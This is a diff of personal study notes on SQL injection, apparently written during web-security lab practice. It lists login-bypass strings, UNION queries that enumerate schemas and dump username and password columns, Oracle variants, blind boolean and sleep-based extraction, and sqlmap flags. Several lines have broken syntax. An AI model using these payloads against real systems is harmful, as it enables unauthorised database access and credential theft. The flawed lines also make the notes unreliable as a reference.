@@ -17,7 +17,8 @@
   - [Command injection](#command-injection)
   - [database](#database)
     - [Steps](#steps)
-    - [Find data oracle](#find-data-oracle)
+    - [UNION](#union)
+      - [Find data oracle](#find-data-oracle)
     - [blind](#blind)
 - [burpsuite](#burpsuite)
   - [Repeater](#repeater)
@@ -195,29 +196,33 @@ Insecure Direct Object Request
 - find columns in table: UNION SELECT NULL,NULL,column_name FROM **information_schema.columns** WHERE table_name= 'Table name'
 - find data: UNION SELECT NULL,NULL,group_concat(column,column,column) from table_nae
 
-- for login: 'or 1=1 (always true) ;-- [comments]
+- Column_name known
+  - aa' field=(COMMAND),field='
 
-- - --; ==> terminate + anything else is comment
-- '# ==> also comment
-- In Burp separate with +
-- id=2' ==> produce error
-- 1 union 1,x,y,z ==> find how many columns
-- 0 union 1,2,database() = database name
-  - 0 union select  1,2,group_concat(table_name) FROM information_schema.tables where table_schema='db_name' = find existing dbs
-    - information_schema = info about all databases and tables
-  - 0 union select  1,2,group_concat(column_name) FROM information_schema.columns where table_name= 'table_name' = find existing columns inside table
-  - 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users = diplay table
-  - 
+- Bypass login: 
+  - admin'-- [everything here is a comment and will be ignored]
+  - or 1 = 1'-- ==> will always return true
 
-- Find tables
-  - Using NULL because it is compatible with all date type
+### UNION
+- join two or more tables + number o columns and data type muss be equal
+- 'UNION SELECT NULL,NULL...-- - ==> until success to find number of columns
+  - NULL = compatible with all data type
+- 'UNION SELECT column1,column2 FROM table_name-- -
+- find db = '0 union 1,2,database()-- -
+- find tables = '0 union select  1,2,group_concat(table_name) FROM information_schema.tables where table_schema='db_name'
+  -  information_schema = info about all databases and tables
 
+- find columns: 0 union select  1,2,group_concat(column_name) FROM information_schema.columns where table_name= 'table_name'-- -
+- content: '0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
+- 
+  
 - Find version (always UNION)
   - Microsoft, MySQL	SELECT @@version
   - Oracle	SELECT * FROM v$version
   - PostgreSQL	SELECT version()
 
-### Find data oracle
+
+#### Find data oracle
 Oracle DB: '+UNION+SELECT+NULL,NULL+FROM+v$version--
 2 Columns strings: '+UNION+SELECT+'abc','abc'+FROM+v$version--
 Show tables: '+UNION+SELECT+table_name,+NULL+FROM+all_tables-- 
@@ -226,21 +231,34 @@ Find content: '+UNION+SELECT+colum1,+column2,+FROM+discovered_table--
 
 ### blind
 - binary
-  -  like a% = starting with a
+  - like a% = starting with a
   - Find DB name: ' UNION SELECT, NULL,NULL,NULL where database() like '%a' 
   - Find table name: ' UNION SELECT NULL,NULL,NULL FROM **information_schema.tables** WHERE **table_schema**='name_db' AND **table_name** like '[]%';--
   - find columns 1: ' UNION SELECT NULL,NULL,NULL FROM **information_schema.colums** WHERE **table_name**='name table' AND **column_name** like '[]%';--
-  - find columns 2: ' UNION SELECT NULL,NULL,NULL FROM **information_schema.colums** WHERE **table_name**='name table' AND **column_name** like '[]%' AND column_name!='found 1';--
+  - find columns 2: ' UNION SELECT NULL,NULL,[sleep(4)]|NULL FROM **information_schema.colums** WHERE **table_name**='name table' AND **column_name** like '[]%' AND column_name!='found 1';--
   - find content: ' UNION SELECT NULL,NULL,NULL FROM **table_name** where **column_1** like 'a%';--
-
-  - admin123' UNION SELECT NULL,NULL, [sleep(4)] 3 FROM information_schema.tables WHERE table_schema = 'db_name' AND table_name like '%';-- ==> brute force to find table name
-
-
 
 
 - Change SQL Command in the trackinID + test
 - Table exists: ' AND (SELECT 'a' FROM users LIMIT 1)='a;
 - Size of string: ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>§1§)='a;==> payload type number to find 1 until n
+  - admin' AND length((SELECT password from users where username='admin'))==37-- -
+  
+- Getting data string per string:
+  - SELECT column FROM table_name LIMIT 0,1-- - //
+    - LIMIT start,from_total ==> LIMIT 0,1 = first, from total 1 || LIMIT 0,2 start 0 from total 2
+  - SUBSTRING((SELECT column FROM table_name LIMIT 0,1)0,1)
+
+- with sqlmap
+  - -u = url
+  - --data="id=123&password=123"
+  - --level= ??
+  - --risk= ??
+  - --dbms=type of db
+  - --technique=???
+  - --dumb
+
+
 - in the intruder: substring method with password list
 ' AND (SELECT SUBSTRING(password,X,1) FROM users WHERE username = 'administrator')='§a§;
  - SUBSTRING(string, start, length)
